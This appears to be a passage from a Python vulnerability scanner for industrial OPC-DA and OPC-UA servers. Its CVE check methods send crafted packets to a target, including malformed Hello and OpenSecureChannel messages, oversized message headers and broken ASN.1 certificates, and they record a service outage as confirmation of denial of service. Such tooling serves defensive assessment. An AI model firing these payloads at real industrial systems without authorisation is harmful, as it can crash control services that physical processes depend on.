            severity=cve_info["severity"],
            confidence=confidence,
            evidence=evidence,
            poc_output="\n".join(poc_output) if poc_output else None,
            remediation=cve_info["remediation"],
            details={
                "cvss": cve_info["cvss"],
                "cwe": cve_info["cwe"],
                "protocol": cve_info["protocol"],
                "test_patterns": format_patterns,
                "note": "Full verification requires OPC-DA client with item operations"
            }
        )
        self.results.append(result)
        return result

    def run_all_checks(self) -> List[CVECheckResult]:
        """Run all OPC-DA CVE checks"""
        self.results = []
        self.check_cve_2021_26414()
        self.check_cve_2018_1285()
        self.check_cve_2006_0743()
        return self.results


class OPCUACVEChecker:
    """
    CVE vulnerability checker for OPC-UA protocol.
    Implements detection and POC for OPC-UA related CVEs.
    """

    def __init__(self, target: str, timeout: float = 5.0, verbose: bool = False):
        self.target = target
        self.timeout = timeout
        self.verbose = verbose
        self.resolved_ip = None
        self.results: List[CVECheckResult] = []
        self._resolve_target()

    def _resolve_target(self):
        """Resolve hostname to IP"""
        try:
            self.resolved_ip = socket.gethostbyname(self.target)
        except socket.gaierror as e:
            raise ValueError(f"Cannot resolve target '{self.target}': {e}")

    def _log(self, message: str):
        """Log verbose output"""
        if self.verbose:
            print(f"    [CVE] {message}")

    def _create_socket(self) -> socket.socket:
        """Create a configured TCP socket"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        return sock

    def _build_opcua_hello(self, endpoint_url: str = None) -> bytes:
        """
        Build OPC-UA Hello message

        HEL message format:
        - MessageType: "HEL" (3 bytes)
        - ChunkType: "F" (1 byte - Final)
        - MessageSize: UInt32
        - ProtocolVersion: UInt32
        - ReceiveBufferSize: UInt32
        - SendBufferSize: UInt32
        - MaxMessageSize: UInt32
        - MaxChunkCount: UInt32
        - EndpointUrl: String
        """
        if endpoint_url is None:
            endpoint_url = f"opc.tcp://{self.target}:{OPCUA_BINARY_PORT}"

        url_bytes = endpoint_url.encode('utf-8')
        url_length = len(url_bytes)

        # Build message body
        body = struct.pack("<I", 0)           # ProtocolVersion
        body += struct.pack("<I", 65535)      # ReceiveBufferSize
        body += struct.pack("<I", 65535)      # SendBufferSize
        body += struct.pack("<I", 2097152)    # MaxMessageSize (2MB)
        body += struct.pack("<I", 0)          # MaxChunkCount (0 = no limit)
        body += struct.pack("<I", url_length)  # EndpointUrl length
        body += url_bytes                      # EndpointUrl

        # Build header
        message_size = 8 + len(body)
        header = b"HEL"
        header += b"F"  # Final chunk
        header += struct.pack("<I", message_size)

        return header + body

    def _parse_opcua_ack(self, data: bytes) -> Tuple[bool, Dict[str, Any]]:
        """Parse OPC-UA ACK message"""
        if len(data) < 8:
            return False, {"error": "Response too short"}

        msg_type = data[0:3]
        chunk_type = data[3:4]
        msg_size = struct.unpack("<I", data[4:8])[0]

        result = {
            "message_type": msg_type.decode('utf-8', errors='replace'),
            "chunk_type": chunk_type.decode('utf-8', errors='replace'),
            "message_size": msg_size
        }

        if msg_type == b"ACK":
            if len(data) >= 28:
                result["protocol_version"] = struct.unpack("<I", data[8:12])[0]
                result["receive_buffer"] = struct.unpack("<I", data[12:16])[0]
                result["send_buffer"] = struct.unpack("<I", data[16:20])[0]
                result["max_message_size"] = struct.unpack("<I", data[20:24])[0]
                result["max_chunk_count"] = struct.unpack("<I", data[24:28])[0]
            return True, result
        elif msg_type == b"ERR":
            if len(data) >= 12:
                result["error_code"] = struct.unpack("<I", data[8:12])[0]
                if len(data) > 16:
                    str_len = struct.unpack("<I", data[12:16])[0]
                    if len(data) >= 16 + str_len:
                        result["error_message"] = data[16:16+str_len].decode('utf-8', errors='replace')
            return False, result

        return False, result

    def _build_get_endpoints_request(self) -> bytes:
        """
        Build OPC-UA GetEndpoints request

        This is used to enumerate server endpoints and their security configurations.
        """
        endpoint_url = f"opc.tcp://{self.target}:{OPCUA_BINARY_PORT}".encode('utf-8')

        # Build GetEndpoints request body
        # RequestHeader (simplified)
        request_header = struct.pack("<Q", 0)  # AuthenticationToken (null)
        request_header += struct.pack("<Q", int(time.time() * 10000000))  # Timestamp
        request_header += struct.pack("<I", 1)  # RequestHandle
        request_header += struct.pack("<I", 0)  # ReturnDiagnostics
        request_header += struct.pack("<I", 0xFFFFFFFF)  # AuditEntryId (null)
        request_header += struct.pack("<I", 10000)  # TimeoutHint
        request_header += struct.pack("<I", 0)  # AdditionalHeader (null)

        # EndpointUrl
        body = struct.pack("<I", len(endpoint_url)) + endpoint_url

        # LocaleIds (empty array)
        body += struct.pack("<I", 0)

        # ProfileUris (empty array)
        body += struct.pack("<I", 0)

        return request_header + body

    def check_opcua_service(self, port: int = OPCUA_BINARY_PORT) -> Tuple[bool, Dict[str, Any]]:
        """Check if OPC-UA service is available"""
        try:
            sock = self._create_socket()
            try:
                sock.connect((self.resolved_ip, port))

                hello = self._build_opcua_hello()
                sock.send(hello)
                response = sock.recv(4096)

                success, details = self._parse_opcua_ack(response)
                return success, details
            finally:
                sock.close()
        except socket.timeout:
            return False, {"error": "Connection timeout"}
        except ConnectionRefusedError:
            return False, {"error": "Connection refused"}
        except Exception as e:
            return False, {"error": str(e)}

    def check_cve_2024_42513(self) -> CVECheckResult:
        """
        CVE-2024-42513: Authentication Bypass on OPC UA .NET Standard Stack HTTPS

        Detection method:
        1. Check for HTTPS endpoint on standard OPC-UA HTTPS port
        2. Test for certificate validation weaknesses
        3. Attempt authentication bypass via misconfigured HTTPS

        POC: Tests for insecure HTTPS configuration that allows auth bypass
        """
        cve_id = "CVE-2024-42513"
        cve_info = CVE_DATABASE[cve_id]
        evidence = []
        poc_output = []

        self._log(f"Checking {cve_id}: {cve_info['name']}")

        vulnerable = False
        confidence = "LOW"

        # Check both standard HTTPS port and OPC-UA HTTPS port
        https_ports = [OPCUA_HTTPS_PORT, 443, 8443, 4843]

        for port in https_ports:
            try:
                # Test 1: Check for HTTPS service with weak TLS configuration
                sock = self._create_socket()
                try:
                    sock.connect((self.resolved_ip, port))

                    # Create SSL context with no verification (to test if server allows it)
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE

                    ssl_sock = context.wrap_socket(sock, server_hostname=self.target)

                    # Get certificate info
                    cert = ssl_sock.getpeercert(binary_form=True)
                    if cert:
                        evidence.append(f"HTTPS service found on port {port}")
                        poc_output.append(f"POC Step 1: Connected to HTTPS on port {port}")

                        # Check cipher suite
                        cipher = ssl_sock.cipher()
                        if cipher:
                            cipher_name = cipher[0]
                            evidence.append(f"Cipher suite: {cipher_name}")

                            # Check for weak ciphers
                            weak_ciphers = ['RC4', 'DES', 'MD5', 'NULL', 'EXPORT', 'anon']
                            for weak in weak_ciphers:
                                if weak in cipher_name.upper():
                                    evidence.append(f"WEAK cipher detected: {cipher_name}")
                                    vulnerable = True
                                    confidence = "HIGH"

                        # Test 2: Try OPC-UA HTTPS endpoint access
                        ssl_sock.send(b"GET /opcua/ HTTP/1.1\r\nHost: " +
                                     self.target.encode() + b"\r\n\r\n")
                        http_response = ssl_sock.recv(4096)

                        if b"200" in http_response or b"OPC" in http_response.upper():
                            evidence.append("OPC-UA HTTPS endpoint accessible")
                            poc_output.append("POC Step 2: OPC-UA endpoint responds on HTTPS")

                            # Check for authentication bypass indicators
                            if b"Unauthorized" not in http_response:
                                evidence.append("HTTPS endpoint accessible without authentication challenge")
                                vulnerable = True
                                confidence = "MEDIUM"
                                poc_output.append("POC: No authentication challenge received - potential bypass")

                    ssl_sock.close()

                except ssl.SSLError as e:
                    if "certificate verify failed" in str(e).lower():
                        evidence.append(f"Port {port}: Certificate validation issues detected")
                    elif "unknown protocol" in str(e).lower():
                        pass  # Not an HTTPS service
                finally:
                    sock.close()

            except socket.timeout:
                continue
            except ConnectionRefusedError:
                continue
            except Exception as e:
                continue

        # Test 3: Check binary OPC-UA service for comparison
        opcua_available, opcua_details = self.check_opcua_service()
        if opcua_available:
            evidence.append("OPC-UA binary service is running")
            evidence.append("Cross-check HTTPS endpoints for authentication consistency")

        if not evidence:
            evidence.append("No HTTPS OPC-UA endpoints detected")
            poc_output.append("POC Result: No vulnerable HTTPS endpoints found")

        result = CVECheckResult(
            cve_id=cve_id,
            vulnerable=vulnerable,
            severity=cve_info["severity"],
            confidence=confidence,
            evidence=evidence,
            poc_output="\n".join(poc_output) if poc_output else None,
            remediation=cve_info["remediation"],
            details={
                "cvss": cve_info["cvss"],
                "cwe": cve_info["cwe"],
                "protocol": cve_info["protocol"],
                "ports_checked": https_ports
            }
        )
        self.results.append(result)
        return result

    def check_cve_2024_45526(self) -> CVECheckResult:
        """
        CVE-2024-45526: Resource Exhaustion in OPC UA .NET Standard Stack

        Detection method:
        1. Connect to OPC-UA service
        2. Send rapid sequence of messages to test rate limiting
        3. Analyze server response patterns for resource exhaustion indicators

        POC: Tests for missing rate limiting that could lead to DoS
        Note: Non-destructive test with limited message volume
        """
        cve_id = "CVE-2024-45526"
        cve_info = CVE_DATABASE[cve_id]
        evidence = []
        poc_output = []

        self._log(f"Checking {cve_id}: {cve_info['name']}")

        vulnerable = False
        confidence = "LOW"

        try:
            # Test 1: Establish OPC-UA connection
            sock = self._create_socket()
            try:
                sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))

                hello = self._build_opcua_hello()
                sock.send(hello)
                response = sock.recv(4096)

                success, details = self._parse_opcua_ack(response)

                if success:
                    evidence.append("OPC-UA service is accessible")
                    poc_output.append("POC Step 1: Established OPC-UA connection")

                    # Analyze server configuration for resource limits
                    if "max_chunk_count" in details:
                        max_chunks = details["max_chunk_count"]
                        if max_chunks == 0 or max_chunks > 100000:
                            evidence.append(f"Server allows unlimited chunks (MaxChunkCount={max_chunks})")
                            vulnerable = True
                            confidence = "MEDIUM"

                    if "max_message_size" in details:
                        max_msg = details["max_message_size"]
                        if max_msg > 10485760:  # > 10MB
                            evidence.append(f"Server allows large messages (MaxMessageSize={max_msg})")
                            if vulnerable:
                                confidence = "HIGH"
                            vulnerable = True

                    # Test 2: Send multiple rapid Hello messages (limited, non-destructive)
                    poc_output.append("POC Step 2: Testing rate limiting with rapid messages")

                    start_time = time.time()
                    success_count = 0
                    test_count = 10  # Limited to avoid actual DoS

                    for i in range(test_count):
                        try:
                            test_sock = self._create_socket()
                            test_sock.settimeout(1.0)
                            test_sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))
                            test_sock.send(hello)
                            test_response = test_sock.recv(4096)
                            if test_response:
                                success_count += 1
                            test_sock.close()
                        except Exception:
                            break

                    elapsed = time.time() - start_time

                    if success_count == test_count:
                        evidence.append(f"Server accepted all {test_count} rapid connections without rate limiting")
                        evidence.append(f"Connection rate: {success_count/elapsed:.1f} connections/second")
                        poc_output.append(f"POC: All {test_count} connections accepted - no rate limiting detected")
                        vulnerable = True
                        if confidence == "LOW":
                            confidence = "MEDIUM"
                    else:
                        evidence.append(f"Server accepted {success_count}/{test_count} rapid connections")
                        poc_output.append(f"POC: Some connections rejected - possible rate limiting")

                else:
                    error = details.get("error", "Unknown error")
                    evidence.append(f"OPC-UA service not responding: {error}")

            finally:
                sock.close()

        except socket.timeout:
            evidence.append("Connection timeout - service may be unavailable")
        except ConnectionRefusedError:
            evidence.append("Connection refused - OPC-UA service not running on standard port")
        except Exception as e:
            evidence.append(f"Check failed: {str(e)}")

        result = CVECheckResult(
            cve_id=cve_id,
            vulnerable=vulnerable,
            severity=cve_info["severity"],
            confidence=confidence,
            evidence=evidence,
            poc_output="\n".join(poc_output) if poc_output else None,
            remediation=cve_info["remediation"],
            details={
                "cvss": cve_info["cvss"],
                "cwe": cve_info["cwe"],
                "protocol": cve_info["protocol"]
            }
        )
        self.results.append(result)
        return result

    def check_cve_2024_33862(self) -> CVECheckResult:
        """
        CVE-2024-33862: Buffer Management Vulnerability in OPC UA .NET Standard Core

        Detection method:
        1. Send crafted messages with unusual buffer sizes
        2. Analyze server response for memory handling issues
        3. Check for error handling in buffer allocation

        POC: Tests buffer handling with edge-case message sizes
        """
        cve_id = "CVE-2024-33862"
        cve_info = CVE_DATABASE[cve_id]
        evidence = []
        poc_output = []

        self._log(f"Checking {cve_id}: {cve_info['name']}")

        vulnerable = False
        confidence = "LOW"

        try:
            # Test 1: Normal connection first
            sock = self._create_socket()
            try:
                sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))

                hello = self._build_opcua_hello()
                sock.send(hello)
                response = sock.recv(4096)

                success, details = self._parse_opcua_ack(response)

                if success:
                    evidence.append("OPC-UA service is accessible")
                    poc_output.append("POC Step 1: Normal OPC-UA connection successful")

                    # Get server's reported buffer limits
                    server_receive_buffer = details.get("receive_buffer", 65535)
                    server_max_message = details.get("max_message_size", 2097152)

                    evidence.append(f"Server receive buffer: {server_receive_buffer}")
                    evidence.append(f"Server max message size: {server_max_message}")

                else:
                    evidence.append("OPC-UA service not responding properly")

            finally:
                sock.close()

            # Test 2: Send Hello with unusual buffer size requests
            poc_output.append("POC Step 2: Testing buffer handling with edge cases")

            test_cases = [
                ("Zero buffer", 0),
                ("Small buffer", 64),
                ("Large buffer", 0x7FFFFFFF),  # Max Int32
                ("Negative-like", 0xFFFFFFFF),  # Max UInt32
            ]

            for test_name, buffer_size in test_cases:
                try:
                    sock = self._create_socket()
                    sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))

                    # Build custom Hello with test buffer size
                    endpoint_url = f"opc.tcp://{self.target}:{OPCUA_BINARY_PORT}".encode('utf-8')
                    body = struct.pack("<I", 0)           # ProtocolVersion
                    body += struct.pack("<I", buffer_size)  # ReceiveBufferSize (test value)
                    body += struct.pack("<I", buffer_size)  # SendBufferSize (test value)
                    body += struct.pack("<I", 0x7FFFFFFF)   # MaxMessageSize
                    body += struct.pack("<I", 0)            # MaxChunkCount
                    body += struct.pack("<I", len(endpoint_url))
                    body += endpoint_url

                    message_size = 8 + len(body)
                    test_hello = b"HEL" + b"F" + struct.pack("<I", message_size) + body

                    sock.send(test_hello)
                    test_response = sock.recv(4096)

                    test_success, test_details = self._parse_opcua_ack(test_response)

                    if test_success:
                        # Server accepted unusual buffer size
                        accepted_recv = test_details.get("receive_buffer", 0)
                        evidence.append(f"{test_name} ({buffer_size}): Server accepted, returned buffer={accepted_recv}")

                        if buffer_size == 0 and accepted_recv > 0:
                            poc_output.append(f"POC: Server accepted zero buffer request - unusual handling")
                        elif buffer_size > 0x7FFFFFFF and test_success:
                            evidence.append("Server accepted oversized buffer value - potential vulnerability")
                            vulnerable = True
                            confidence = "MEDIUM"
                    else:
                        error = test_details.get("error_message", test_details.get("error_code", "Unknown"))
                        evidence.append(f"{test_name} ({buffer_size}): Rejected - {error}")

                    sock.close()

                except socket.timeout:
                    evidence.append(f"{test_name}: Server stopped responding (potential crash)")
                    vulnerable = True
                    confidence = "HIGH"
                    poc_output.append(f"POC WARNING: Server became unresponsive after {test_name}")
                except Exception as e:
                    evidence.append(f"{test_name}: Error - {str(e)}")

        except socket.timeout:
            evidence.append("Initial connection timeout")
        except ConnectionRefusedError:
            evidence.append("Connection refused - OPC-UA service not running")
        except Exception as e:
            evidence.append(f"Check failed: {str(e)}")

        result = CVECheckResult(
            cve_id=cve_id,
            vulnerable=vulnerable,
            severity=cve_info["severity"],
            confidence=confidence,
            evidence=evidence,
            poc_output="\n".join(poc_output) if poc_output else None,
            remediation=cve_info["remediation"],
            details={
                "cvss": cve_info["cvss"],
                "cwe": cve_info["cwe"],
                "protocol": cve_info["protocol"]
            }
        )
        self.results.append(result)
        return result

    def check_cve_2019_19135(self) -> CVECheckResult:
        """
        CVE-2019-19135: Weak Randomness in OPC UA .NET Standard Stack

        Detection method:
        1. Analyze nonce/random values from multiple connections
        2. Check for patterns suggesting weak PRNG
        3. Identify potential credential reuse scenarios

        POC: Collects and analyzes random values for weakness patterns
        """
        cve_id = "CVE-2019-19135"
        cve_info = CVE_DATABASE[cve_id]
        evidence = []
        poc_output = []

        self._log(f"Checking {cve_id}: {cve_info['name']}")

        vulnerable = False
        confidence = "LOW"

        collected_values = []

        try:
            poc_output.append("POC Step 1: Collecting random values from multiple connections")

            # Collect values from multiple connections
            for i in range(5):
                try:
                    sock = self._create_socket()
                    sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))

                    hello = self._build_opcua_hello()
                    sock.send(hello)
                    response = sock.recv(4096)

                    if len(response) > 8:
                        # Store response for analysis
                        collected_values.append(response)

                        # Look for patterns in the response bytes
                        if len(response) >= 28:
                            # Extract bytes that might contain nonces/random values
                            potential_random = response[8:28]
                            collected_values.append(potential_random)

                    sock.close()
                    time.sleep(0.1)  # Small delay between connections

                except Exception:
                    continue

            if len(collected_values) >= 3:
                evidence.append(f"Collected {len(collected_values)} samples for analysis")
                poc_output.append(f"POC Step 2: Analyzing {len(collected_values)} samples for weak randomness")

                # Analyze for patterns
                # Check for repeated values
                unique_values = set(tuple(v) if isinstance(v, bytes) else v for v in collected_values)
                if len(unique_values) < len(collected_values):
                    evidence.append(f"Repeated values detected: {len(collected_values)} samples, only {len(unique_values)} unique")
                    vulnerable = True
                    confidence = "MEDIUM"
                    poc_output.append("POC: Repeated random values detected - potential weak PRNG")

                # Check for sequential patterns
                if len(collected_values) >= 2:
                    for i in range(len(collected_values) - 1):
                        if isinstance(collected_values[i], bytes) and isinstance(collected_values[i+1], bytes):
                            # Simple pattern detection
                            if collected_values[i][:4] == collected_values[i+1][:4]:
                                evidence.append("Similar prefix patterns in consecutive samples")
                                if not vulnerable:
                                    vulnerable = True
                                    confidence = "LOW"

                # Additional: Check if values appear to be timestamps (weak randomness indicator)
                for val in collected_values:
                    if isinstance(val, bytes) and len(val) >= 8:
                        timestamp_candidate = struct.unpack("<Q", val[:8])[0]
                        # Check if it looks like a timestamp
                        if 1000000000 < timestamp_candidate < 2000000000:
                            evidence.append("Server may use timestamps as random values")
                            poc_output.append("POC: Timestamp-like values detected in response")
                            vulnerable = True
                            confidence = "MEDIUM"
                            break

            else:
                evidence.append("Insufficient samples collected for analysis")

            # Check for legacy protocol version
            sock = self._create_socket()
            try:
                sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))
                hello = self._build_opcua_hello()
                sock.send(hello)
                response = sock.recv(4096)

                success, details = self._parse_opcua_ack(response)
                if success and "protocol_version" in details:
                    protocol_version = details["protocol_version"]
                    evidence.append(f"Server protocol version: {protocol_version}")
                    if protocol_version == 0:
                        evidence.append("Legacy protocol version detected - higher risk of weak randomness")
                        poc_output.append("POC: Legacy protocol version may have weak PRNG implementation")
                        if vulnerable:
                            confidence = "HIGH"
                        vulnerable = True

                sock.close()
            except Exception:
                pass

        except socket.timeout:
            evidence.append("Connection timeout")
        except ConnectionRefusedError:
            evidence.append("Connection refused - OPC-UA service not running")
        except Exception as e:
            evidence.append(f"Check failed: {str(e)}")

        result = CVECheckResult(
            cve_id=cve_id,
            vulnerable=vulnerable,
            severity=cve_info["severity"],
            confidence=confidence,
            evidence=evidence,
            poc_output="\n".join(poc_output) if poc_output else None,
            remediation=cve_info["remediation"],
            details={
                "cvss": cve_info["cvss"],
                "cwe": cve_info["cwe"],
                "protocol": cve_info["protocol"],
                "samples_analyzed": len(collected_values)
            }
        )
        self.results.append(result)
        return result

    def check_cve_2018_7559(self) -> CVECheckResult:
        """
        CVE-2018-7559: Private Key Exposure in OPC UA .NET Stack

        Detection method:
        1. Check for vulnerable security policy configurations
        2. Test for information leakage in error responses
        3. Analyze certificate handling behavior

        POC: Tests for conditions that could expose private key material
        """
        cve_id = "CVE-2018-7559"
        cve_info = CVE_DATABASE[cve_id]
        evidence = []
        poc_output = []

        self._log(f"Checking {cve_id}: {cve_info['name']}")

        vulnerable = False
        confidence = "LOW"

        try:
            # Test 1: Check OPC-UA service availability and security info
            sock = self._create_socket()
            try:
                sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))

                hello = self._build_opcua_hello()
                sock.send(hello)
                response = sock.recv(4096)

                success, details = self._parse_opcua_ack(response)

                if success:
                    evidence.append("OPC-UA service is accessible")
                    poc_output.append("POC Step 1: OPC-UA service responding")

                    # Test 2: Send malformed security token to check error handling
                    poc_output.append("POC Step 2: Testing security token error handling")

                    # Build a malformed OpenSecureChannel request
                    # This tests if the server leaks information in error responses
                    malformed_token = b"OPN" + b"F"  # Open Secure Channel
                    malformed_token += struct.pack("<I", 100)  # Message size
                    malformed_token += struct.pack("<I", 0)  # Secure channel ID
                    malformed_token += struct.pack("<I", 0)  # Security policy URI length

                    # Add garbage data to trigger error
                    malformed_token += b"\xFF" * 84  # Pad to claimed size

                    try:
                        sock.send(malformed_token)
                        error_response = sock.recv(4096)

                        if error_response:
                            # Analyze error response for information leakage
                            if len(error_response) > 12:
                                error_msg_type = error_response[0:3]
                                if error_msg_type == b"ERR":
                                    evidence.append("Server returned error response (expected)")

                                    # Check if error response is excessively verbose
                                    if len(error_response) > 100:
                                        evidence.append(f"Verbose error response: {len(error_response)} bytes")
                                        poc_output.append("POC: Server returns detailed error info")

                                        # Check for stack traces or sensitive info in error
                                        error_str = error_response.decode('utf-8', errors='replace')
                                        sensitive_patterns = [
                                            'private', 'key', 'certificate', 'stack',
                                            'exception', 'trace', 'password', 'secret'
                                        ]
                                        for pattern in sensitive_patterns:
                                            if pattern.lower() in error_str.lower():
                                                evidence.append(f"Sensitive keyword '{pattern}' found in error response")
                                                vulnerable = True
                                                confidence = "MEDIUM"
                                else:
                                    evidence.append(f"Unexpected response type: {error_msg_type}")
                    except socket.timeout:
                        evidence.append("Server did not respond to malformed token")

            finally:
                sock.close()

            # Test 3: Check for legacy security policy support
            poc_output.append("POC Step 3: Checking security policy configuration")

            # Connect again and check for security policy indicators
            sock = self._create_socket()
            try:
                sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))

                # Try to initiate connection with deprecated security policy
                endpoint_url = f"opc.tcp://{self.target}:{OPCUA_BINARY_PORT}".encode('utf-8')
                deprecated_policy = "http://opcfoundation.org/UA/SecurityPolicy#Basic128Rsa15".encode('utf-8')

                # Build OpenSecureChannel with deprecated policy
                body = struct.pack("<I", 0)  # SecureChannelId (new channel)
                body += struct.pack("<I", len(deprecated_policy)) + deprecated_policy  # Security Policy
                body += struct.pack("<I", len(b"")) + b""  # Sender cert (empty for initial)
                body += struct.pack("<I", len(b"")) + b""  # Receiver cert thumbprint

                message = b"OPN" + b"F"
                message += struct.pack("<I", 8 + len(body))
                message += body

                sock.send(message)
                policy_response = sock.recv(4096)

                if policy_response and policy_response[0:3] == b"OPN":
                    evidence.append("Server accepts deprecated Basic128Rsa15 security policy")
                    evidence.append("This policy has known weaknesses that could expose key material")
                    vulnerable = True
                    confidence = "MEDIUM"
                    poc_output.append("POC: Server accepts deprecated security policy - potential key exposure vector")
                elif policy_response and policy_response[0:3] == b"ACK":
                    evidence.append("Server requires channel before security negotiation")
                elif policy_response and policy_response[0:3] == b"ERR":
                    evidence.append("Server rejected deprecated security policy (good)")

            finally:
                sock.close()

        except socket.timeout:
            evidence.append("Connection timeout")
        except ConnectionRefusedError:
            evidence.append("Connection refused - OPC-UA service not running")
        except Exception as e:
            evidence.append(f"Check failed: {str(e)}")

        result = CVECheckResult(
            cve_id=cve_id,
            vulnerable=vulnerable,
            severity=cve_info["severity"],
            confidence=confidence,
            evidence=evidence,
            poc_output="\n".join(poc_output) if poc_output else None,
            remediation=cve_info["remediation"],
            details={
                "cvss": cve_info["cvss"],
                "cwe": cve_info["cwe"],
                "protocol": cve_info["protocol"]
            }
        )
        self.results.append(result)
        return result

    def check_cve_2022_37012(self) -> CVECheckResult:
        """
        CVE-2022-37012: Denial of Service via Crafted Messages

        Detection method:
        1. Send crafted messages with unusual structures
        2. Monitor for service degradation or crash indicators
        3. Analyze error handling for DoS conditions

        POC: Tests DoS vulnerability with crafted message (non-destructive)
        """
        cve_id = "CVE-2022-37012"
        cve_info = CVE_DATABASE[cve_id]
        evidence = []
        poc_output = []

        self._log(f"Checking {cve_id}: {cve_info['name']}")

        vulnerable = False
        confidence = "LOW"

        try:
            # Test 1: Verify service is available
            sock = self._create_socket()
            try:
                sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))

                hello = self._build_opcua_hello()
                sock.send(hello)
                response = sock.recv(4096)

                success, details = self._parse_opcua_ack(response)

                if success:
                    evidence.append("OPC-UA service is accessible")
                    poc_output.append("POC Step 1: Initial connection successful")
                else:
                    evidence.append("OPC-UA service not responding properly")
                    return CVECheckResult(
                        cve_id=cve_id,
                        vulnerable=False,
                        severity=cve_info["severity"],
                        confidence="LOW",
                        evidence=evidence,
                        poc_output=None,
                        remediation=cve_info["remediation"],
                        details={"cvss": cve_info["cvss"], "cwe": cve_info["cwe"]}
                    )

            finally:
                sock.close()

            # Test 2: Send crafted message with abnormal structure
            poc_output.append("POC Step 2: Testing with crafted messages")

            crafted_messages = [
                # Message claiming huge size but providing minimal data
                ("Oversized claim", b"MSG" + b"F" + struct.pack("<I", 0x7FFFFFFF) + b"\x00" * 100),

                # Message with zero size
                ("Zero size", b"MSG" + b"F" + struct.pack("<I", 0)),

                # Message with negative-like size
                ("Negative size", b"MSG" + b"F" + struct.pack("<I", 0xFFFFFFFF) + b"\x00" * 50),

                # Chunked message with invalid chunk type
                ("Invalid chunk", b"MSG" + b"X" + struct.pack("<I", 50) + b"\x00" * 42),
            ]

            for test_name, crafted_msg in crafted_messages:
                try:
                    sock = self._create_socket()
                    sock.settimeout(2.0)  # Short timeout for DoS test
                    sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))

                    # Send hello first to establish connection
                    sock.send(hello)
                    sock.recv(4096)

                    # Send crafted message
                    sock.send(crafted_msg)

                    try:
                        crafted_response = sock.recv(4096)
                        if crafted_response:
                            if crafted_response[0:3] == b"ERR":
                                evidence.append(f"{test_name}: Server returned error (expected)")
                            else:
                                evidence.append(f"{test_name}: Server returned unexpected response")
                                vulnerable = True
                                confidence = "MEDIUM"
                    except socket.timeout:
                        evidence.append(f"{test_name}: Server did not respond (potential processing issue)")

                    sock.close()

                except socket.timeout:
                    evidence.append(f"{test_name}: Connection timeout after crafted message")
                    poc_output.append(f"POC WARNING: Server may have become unresponsive after {test_name}")
                    vulnerable = True
                    confidence = "HIGH"
                except ConnectionRefusedError:
                    evidence.append(f"{test_name}: Connection refused (possible service restart)")
                    vulnerable = True
                    confidence = "HIGH"
                except Exception as e:
                    evidence.append(f"{test_name}: Error - {str(e)}")

                time.sleep(0.2)  # Brief pause between tests

            # Test 3: Verify service still responds after crafted messages
            poc_output.append("POC Step 3: Verifying service availability after tests")

            try:
                sock = self._create_socket()
                sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))
                sock.send(hello)
                final_response = sock.recv(4096)
                sock.close()

                if final_response:
                    evidence.append("Service still responding after crafted messages")
                    poc_output.append("POC: Service recovered - no persistent DoS")
                else:
                    evidence.append("Service degraded after crafted messages")
                    vulnerable = True
                    confidence = "MEDIUM"

            except Exception as e:
                evidence.append(f"Service not responding after tests: {str(e)}")
                vulnerable = True
                confidence = "HIGH"
                poc_output.append("POC ALERT: Service appears to be down after crafted messages")

        except socket.timeout:
            evidence.append("Initial connection timeout")
        except ConnectionRefusedError:
            evidence.append("Connection refused - OPC-UA service not running")
        except Exception as e:
            evidence.append(f"Check failed: {str(e)}")

        result = CVECheckResult(
            cve_id=cve_id,
            vulnerable=vulnerable,
            severity=cve_info["severity"],
            confidence=confidence,
            evidence=evidence,
            poc_output="\n".join(poc_output) if poc_output else None,
            remediation=cve_info["remediation"],
            details={
                "cvss": cve_info["cvss"],
                "cwe": cve_info["cwe"],
                "protocol": cve_info["protocol"]
            }
        )
        self.results.append(result)
        return result

    def check_cve_2022_37013(self) -> CVECheckResult:
        """
        CVE-2022-37013: Infinite Loop with Crafted Certificates

        Detection method:
        1. Send malformed certificate data in OpenSecureChannel
        2. Monitor for processing delays indicating infinite loops
        3. Check server recovery behavior

        POC: Tests certificate parsing with edge-case data
        """
        cve_id = "CVE-2022-37013"
        cve_info = CVE_DATABASE[cve_id]
        evidence = []
        poc_output = []

        self._log(f"Checking {cve_id}: {cve_info['name']}")

        vulnerable = False
        confidence = "LOW"

        try:
            # Test 1: Verify service is available
            sock = self._create_socket()
            try:
                sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))

                hello = self._build_opcua_hello()
                sock.send(hello)
                response = sock.recv(4096)

                success, details = self._parse_opcua_ack(response)

                if not success:
                    evidence.append("OPC-UA service not responding properly")
                    return CVECheckResult(
                        cve_id=cve_id,
                        vulnerable=False,
                        severity=cve_info["severity"],
                        confidence="LOW",
                        evidence=evidence,
                        remediation=cve_info["remediation"]
                    )

                evidence.append("OPC-UA service is accessible")
                poc_output.append("POC Step 1: Initial connection successful")

            finally:
                sock.close()

            # Test 2: Send OpenSecureChannel with crafted certificate
            poc_output.append("POC Step 2: Testing certificate parsing")

            # Create malformed certificate structures
            cert_test_cases = [
                ("Empty certificate", b""),
                ("Circular reference", b"\x30\x80\xa0\x80\x30\x80\x30\x80" * 100),  # Nested indefinite length
                ("Huge length encoding", b"\x30\x84\x7F\xFF\xFF\xFF"),  # Claims 2GB length
                ("Invalid ASN.1", b"\x30\x03\x02\x01\xFF\xFF\xFF"),  # Invalid integer encoding
            ]

            for test_name, crafted_cert in cert_test_cases:
                try:
                    sock = self._create_socket()
                    sock.settimeout(3.0)  # Timeout to detect infinite loops
                    sock.connect((self.resolved_ip, OPCUA_BINARY_PORT))

                    # Send hello
                    sock.send(hello)
                    sock.recv(4096)

                    # Build OpenSecureChannel with crafted certificate
                    security_policy = OPCUA_SECURITY_POLICY_BASIC256.encode('utf-8')

                    body = struct.pack("<I", 0)  # SecureChannelId
                    body += struct.pack("<I", len(security_policy)) + security_policy
                    body += struct.pack("<I", len(crafted_cert)) + crafted_cert  # Sender certificate
                    body += struct.pack("<I", 0)  # Receiver cert thumbprint (empty)

